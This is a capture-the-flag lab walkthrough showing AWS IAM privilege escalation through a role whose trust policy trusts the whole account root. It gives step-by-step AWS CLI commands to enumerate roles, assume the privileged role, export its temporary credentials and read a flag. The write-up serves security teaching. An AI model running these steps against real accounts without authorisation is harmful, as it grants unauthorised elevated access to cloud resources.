# Walkthrough: AssumeRole Privilege Escalation

## Lab Objective

This lab demonstrates how an overly permissive IAM role trust policy can be exploited to escalate privileges. When a role trusts the entire AWS account root principal, ANY user or role in the account can assume it.

## Prerequisites

- AWS CLI installed and configured
- Role ARN from the lab deployment
- Basic understanding of AWS IAM and STS

## Step-by-Step Solution

### Step 1: Assume the Lab Entry Role

Assume the lab entry role using the role ARN provided by the lab deployment:

```bash
# Replace with your specific role ARN from the deployment output
ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/specter-lab-assumerole-entry"

# Assume the role and get temporary credentials
CREDS=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name lab-session --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo $CREDS | awk '{print $3}')
export AWS_DEFAULT_REGION="us-east-1"
```

Verify your identity:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
    "UserId": "AROA...:lab-session",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-assumerole-entry/lab-session"
}
```

Note that your ARN shows `assumed-role` indicating you're using temporary credentials from the entry role.

### Step 2: Enumerate Current Permissions

Check what policies are attached to your role:

```bash
# Extract the role name from your assumed role session
ROLE_NAME=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
echo "Current role: $ROLE_NAME"

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME | jq

# Get the inline policy document
aws iam get-role-policy --role-name $ROLE_NAME --policy-name specter-lab-assumerole-entry-policy | jq
```

You'll see you have:
- Read permissions on your own role
- `iam:ListRoles` and `iam:GetRole` to discover roles
- `sts:AssumeRole` on all resources

### Step 3: Discover Available Roles

List all IAM roles in the account:

```bash
aws iam list-roles --query 'Roles[*].[RoleName,Description]' --output table
```

Look for roles that might have elevated permissions. You should see:
- `specter-lab-assumerole-privileged` - The target role with elevated privileges

### Step 4: Examine the Privileged Role's Trust Policy

Get details about the privileged role:

```bash
ROLE_NAME="specter-lab-assumerole-privileged"

aws iam get-role --role-name $ROLE_NAME | jq
```

Expected output shows the trust policy:
```json
{
    "Role": {
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::123456789012:root"
                },
                "Action": "sts:AssumeRole"
            }]
        },
        ...
    }
}
```

**Key Finding**: The trust policy allows `arn:aws:iam::ACCOUNT_ID:root` which means ANY principal in the account can assume this role!

### Step 5: Assume the Privileged Role

Use `sts:AssumeRole` to obtain temporary credentials for the privileged role:

```bash
ROLE_ARN=$(aws iam get-role --role-name $ROLE_NAME --query 'Role.Arn' --output text)

aws sts assume-role --role-arn $ROLE_ARN --role-session-name attacker-session --output json > /tmp/assumed-role-creds.json

cat /tmp/assumed-role-creds.json | jq
```

Expected output:
```json
{
    "Credentials": {
        "AccessKeyId": "ASIA...",
        "SecretAccessKey": "...",
        "SessionToken": "...",
        "Expiration": "2024-01-15T13:00:00Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA...:attacker-session",
        "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-assumerole-privileged/attacker-session"
    }
}
```

### Step 6: Configure AWS CLI with Temporary Credentials

Export the temporary credentials:

```bash
export AWS_ACCESS_KEY_ID=$(cat /tmp/assumed-role-creds.json | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/assumed-role-creds.json | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(cat /tmp/assumed-role-creds.json | jq -r '.Credentials.SessionToken')
```

Verify you're now using the assumed role:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
    "UserId": "AROA...:attacker-session",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-assumerole-privileged/attacker-session"
}
```

Notice the ARN now shows you're using the assumed role!

### Step 7: Verify Elevated Privileges

Now with the assumed role credentials, you can verify you have different permissions. For example, check what roles you can see attached policies for:

```bash
# List the policies attached to the privileged role you just assumed
aws iam list-attached-role-policies --role-name specter-lab-assumerole-privileged | jq
aws iam list-role-policies --role-name specter-lab-assumerole-privileged | jq
```

You can also verify you've gained additional permissions by checking the inline policy:

```bash
aws iam get-role-policy --role-name specter-lab-assumerole-privileged --policy-name specter-lab-assumerole-flag-access | jq
```

## Capture the Flag

### Step 8: Retrieve the Flag

Now with the privileged role's credentials, retrieve the flag:

```bash
aws iam get-role --role-name specter-lab-assumerole-flag-holder --query 'Role.Tags[?Key==`flag`].Value' --output text
```

Expected output:
```
SPECTER:4ssum3_r0l3_trust_p0l1cy_pwn3d
```

## Understanding the Attack

### Why This Works

1. **Overly Permissive Trust Policy**: The privileged role trusts `arn:aws:iam::ACCOUNT_ID:root`
2. **Root Principal Meaning**: This means ANY authenticated principal in the account can assume it
3. **Immediate Effect**: `sts:AssumeRole` returns temporary credentials immediately
4. **No Additional Checks**: No MFA, external ID, or other conditions were required

### Attack Flow

```
Entry Role (limited privileges)
    |
    | Discover role with overly permissive trust policy
    |
    | sts:AssumeRole
    |
Privileged Role (elevated privileges)
    |
Success - Can now perform privileged actions!
```

## Additional Resources

- [AWS STS AssumeRole Documentation](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html)
- [IAM Role Trust Policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_terms-and-concepts.html#iam-term-trust-policy)
- [Confused Deputy Problem](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html)
- [AWS IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html)
